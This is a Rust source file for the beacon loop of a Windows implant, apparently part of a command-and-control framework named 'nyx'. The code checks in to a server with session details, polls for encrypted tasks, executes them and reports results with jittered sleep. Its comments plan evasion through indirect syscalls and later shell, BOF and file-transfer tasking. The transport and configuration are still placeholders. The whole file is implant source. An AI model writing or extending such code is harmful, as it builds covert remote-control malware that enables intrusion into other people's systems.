//! Beacon task loop for the PIC implant.
//!
//! Mirrors agent-dev's loop but `no_std`: check-in (SessionInfo) → every sleep
//! cycle, POST last cycle's responses, receive tasks, execute, repeat. The
//! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
//! transport (WinHTTP, not ureq) and the sleeper differ.
//!
//! M0: the loop skeleton + protocol reuse are real and type-check. The
//! transport (`transport::post_frame`) returns None until the full WinHTTP
//! wiring lands, so the loop retries check-in indefinitely — structurally
//! correct, ready for the convergence step to drop in live HTTP.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use nyx_protocol::{
    encode_frame, open_frame, parse_frame, wire::Writer, Command, ImplantKeypair, Response,
    SessionInfo, Task, TaskResponse,
};

/// Build config baked into the implant at build time (per-build encrypted config
/// in a later phase; for M0 these come from compile-time env or defaults).
pub struct Config {
    pub server_host: String,
    pub server_port: u16,
    pub beacon_uri: String,
    pub server_pub: [u8; 32],
    pub sleep_seconds: u32,
    pub jitter_pct: u8,
    pub use_tls: bool,
}

/// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
pub unsafe fn beacon_loop() {
    let cfg = load_config();
    let kp = ImplantKeypair::generate();
    let key = kp.session_key(&cfg.server_pub);
    let pubkey = kp.public_bytes();
    let beacon_id: u32 = 0x1337; // TODO: random via syscalls (A6)

    let mut info_writer = Writer::new();
    let info = SessionInfo {
        beacon_id,
        hostname: String::from("host"),
        username: String::from("user"),
        os: String::from("Windows"),
        arch: 0,
        pid: 0, // TODO: GetCurrentProcessId via resolved kernel32
        is_admin: 0,
    };
    info.encode(&mut info_writer);
    let info_plain = info_writer.into_bytes();

    // ---- check-in (retry) ----
    let mut counter = 0u64;
    loop {
        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
        counter += 1;
        let resp = crate::transport::post_frame(
            cfg.server_host.as_bytes(),
            cfg.server_port,
            cfg.beacon_uri.as_bytes(),
            &frame,
        );
        if resp.is_some() {
            break;
        }
        sleep_seconds(cfg.sleep_seconds);
    }

    // ---- task loop ----
    let mut pending: Vec<TaskResponse> = Vec::new();
    loop {
        sleep_jitter(cfg.sleep_seconds, cfg.jitter_pct);
        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
        counter += 1;
        pending.clear();

        let Some(body) = crate::transport::post_frame(
            cfg.server_host.as_bytes(),
            cfg.server_port,
            cfg.beacon_uri.as_bytes(),
            &frame,
        ) else {
            continue;
        };

        let Ok(raw) = parse_frame(&body) else { continue };
        let Ok(plaintext) = open_frame(&key, &raw) else { continue };
        let Ok(tasks) = Task::decode_vec(&plaintext) else { continue };

        for t in tasks {
            if matches!(t.command, Command::Exit) {
                return;
            }
            for response in execute(t.command) {
                pending.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
            }
        }
    }
}

/// Execute a command. M0: minimal — Ping/Shell/Sleep/Exit. BOF + file transfer
/// arrive with the postex milestone.
fn execute(cmd: Command) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Sleep { .. } => vec![Response::Ok], // TODO: re-task sleep
        Command::Exit => vec![Response::Ok],
        // Everything else is unimplemented in the PIC implant for M0; ack so the
        // wire stays round-trippable.
        _ => vec![Response::Err(String::from("not implemented in PIC implant"))],
    }
}

/// Load build-time config. M0: placeholder defaults; the per-build encrypted
/// config (nyx-config crate) lands in a later phase.
fn load_config() -> Config {
    Config {
        server_host: String::from("127.0.0.1"),
        server_port: 8443,
        beacon_uri: String::from("/beacon"),
        server_pub: [0u8; 32], // TODO: bake real server_pub at build time
        sleep_seconds: 5,
        jitter_pct: 20,
        use_tls: false,
    }
}

/// Sleep N seconds. M0: busy-loop placeholder; A6 replaces with a syscall-based
/// sleep (NtDelayExecution) via indirect syscalls.
fn sleep_seconds(_s: u32) {
    // TODO: NtDelayExecution via resolved ntdll (indirect syscall).
    core::hint::spin_loop();
}

fn sleep_jitter(base: u32, jitter_pct: u8) {
    sleep_seconds(base);
    let _ = jitter_pct;
}
